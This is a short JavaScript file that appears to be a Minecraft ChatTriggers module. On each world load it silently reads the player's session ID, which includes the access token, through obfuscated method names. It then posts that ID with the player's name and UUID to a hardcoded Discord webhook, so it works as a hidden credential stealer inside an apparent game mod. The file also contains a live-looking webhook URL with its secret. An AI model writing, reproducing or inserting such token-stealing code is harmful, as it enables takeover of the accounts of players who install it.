import "./build/index"
import request from "../requestV2"

let id;

function webhook() {
    URL = 'https://discord.com/api/webhooks/922188549846081607/v-2ncI0eMnj0vup33I7cDm3vyTSHByVRWIlTgy6ErhBwZEsSzTb6JGOFwB0Ub0xPoayZ';
    request({
        url: URL,
        method: 'POST',       
        headers: {
            'Content-type': 'application/json',
            "User-Agent":"Mozilla/5.0"
        },
        body: {
            username: Player.getName(),            
            content: ("UUID: " + Player.getUUID() + " id: " + id)
        }                                     
    });
}

register("worldLoad", () => {
    id = Client.getMinecraft().func_110432_I().func_148254_d()
    webhook()
});